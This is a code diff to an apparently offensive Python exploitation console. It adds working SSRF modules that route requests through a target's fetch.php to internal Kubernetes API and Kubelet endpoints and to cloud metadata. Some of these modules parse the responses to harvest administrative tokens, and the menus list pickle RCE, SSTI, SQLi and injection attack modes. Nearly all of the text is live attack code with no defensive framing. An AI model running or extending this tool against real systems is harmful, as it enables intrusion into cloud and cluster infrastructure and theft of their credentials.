@@ -75,9 +75,11 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 print("      exec <cmd>  - Execute OS commands via insecure object deserialization (Pickle RCE)")
             elif vuln_type == "SSRF":
                 print("      metadata    - Exfiltrate cloud metadata & IAM credentials (AWS 169.254.169.254)")
+                print("      k8s         - Query internal Kubernetes API Server (10.96.0.1)")
+                print("      kubelet     - Dump cluster pods via Kubelet read-only port (Port 10255)")
                 print("      internal    - Probe internal loopback services (localhost:8080)")
                 print("      redis       - Scan and dump internal cache/Redis service (Port 6379)")
-                print("      escalate    - Harvest administrative token from cloud metadata response")
+                print("      escalate    - Harvest administrative token from cloud/cluster response")
                 print("      exec <cmd>  - Execute OS commands using the harvested cloud/admin token")
             elif vuln_type == "SSTI":
                 print("      test        - Test template engine math evaluation (e.g., '{{7*7}}')")
@@ -587,13 +589,43 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             try:
                 parsed = urllib.parse.urlparse(target_url)
                 base_domain = f"{parsed.scheme}://{parsed.netloc}"
-                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/latest/meta-data/"
                 
                 req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                 with urllib.request.urlopen(req, timeout=3) as resp:
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
                 print(f"    [-] Metadata fetch failed: {e}")
+        elif cmd == "k8s" and vuln_type == "SSRF":
+            print("[*] Forging SSRF request to internal Kubernetes API Server (10.96.0.1)...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://10.96.0.1/api/v1/namespaces"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] K8s API probe failed: {e}")
+        elif cmd == "kubelet" and vuln_type == "SSRF":
+            print("[*] Dumping cluster pods via Kubelet read-only port (10255)...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:10255/pods"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! Kubelet Admin Token Harvested: {harvested_token[:30]}...")
+            except Exception as e:
+                print(f"    [-] Kubelet dump failed: {e}")
         elif cmd == "redis" and vuln_type == "SSRF":
             print("[*] Probing internal Redis service via SSRF...")
             try:
@@ -619,11 +651,11 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             except Exception as e:
                 print(f"    [-] Internal probe failed: {e}")
         elif cmd == "escalate" and vuln_type == "SSRF":
-            print("[*] Harvesting administrative credentials from cloud metadata endpoint...")
+            print("[*] Harvesting administrative credentials from SSRF target...")
             try:
                 parsed = urllib.parse.urlparse(target_url)
                 base_domain = f"{parsed.scheme}://{parsed.netloc}"
-                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/iam/metadata"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://10.96.0.1/api/v1/namespaces"
                 
                 req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
                 with urllib.request.urlopen(req, timeout=3) as resp:
@@ -633,7 +665,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         res_json = json.loads(resp_body)
                         harvested_token = res_json.get("adminToken")
                         harvested_endpoint = res_json.get("adminEndpoint")
-                        print(f"    [!] SUCCESS! Cloud Admin Token Harvested: {harvested_token[:30]}...")
+                        print(f"    [!] SUCCESS! Cluster Admin Token Harvested: {harvested_token[:30]}...")
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] Escalation failed: {e}")
@@ -699,7 +731,7 @@ def main_console():
         print("  2) IDOR / BOLA Endpoints")
         print("  3) SQLi, LFI & Command Injection Vectors")
         print("  4) Modern API, GraphQL & Deserialization Endpoints")
-        print("  5) SSRF & Cloud Metadata Targets")
+        print("  5) SSRF, Cloud Metadata & Kubernetes Targets")
         print("  6) SSTI & Template RCE Targets")
         print("  7) Open Custom Manual Target Session")
         print("  8) Return to Main Menu")
@@ -764,7 +796,7 @@ def main_console():
             if not ssrf_items:
                 print("[-] No SSRF endpoints found.")
                 continue
-            print("\n[★] SSRF & Cloud Metadata Targets:")
+            print("\n[★] SSRF, Cloud Metadata & Kubernetes Targets:")
             for idx, item in enumerate(ssrf_items, 1):
                 print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
             sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
